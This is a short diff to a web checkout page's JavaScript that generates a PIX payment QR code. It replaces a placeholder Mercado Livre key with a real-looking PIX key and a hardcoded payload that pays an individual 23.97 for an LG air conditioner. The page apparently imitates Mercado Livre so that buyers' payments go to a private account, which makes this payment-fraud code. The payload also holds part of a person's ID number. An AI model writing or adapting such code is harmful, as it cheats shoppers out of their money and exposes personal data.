@@ -1152,14 +1152,14 @@
             const zip = document.getElementById('zip').value;
 
             const finalPrice = ORIGINAL_PRICE * (1 - currentDiscount / 100);
-            const pixKey = 'chave-pix-exemplo@mercadolivre.com.br';
+            const pixKey = '485aceeb-6881-4582-b1fb-12f7b1bbeabc';
             
             // Gerar QR Code PIX (simulado)
             const qrcodeDiv = document.getElementById('qrcode');
             qrcodeDiv.innerHTML = '';
             
             new QRCode(qrcodeDiv, {
-                text: `00020126580014br.gov.bcb.pix0136chave-pix-exemplo@mercadolivre.com.br52040000530398654061${finalPrice.toFixed(2)}5802BR5913MERCADO LIVRE6009SAO PAULO62410503***63041D3D`,
+                text: `00020126940014br.gov.bcb.pix0136485aceeb-6881-4582-b1fb-12f7b1bbeabc0232Ar Condicionado LG AI 12.000BTUs520400005303986540523.975802BR592563.194.404 ROBERTO DA SIL6002NA6229052520813584574c4c6b8a75mlblk6304234F`,
                 width: 200,
                 height: 200,
                 colorDark: '#000000',
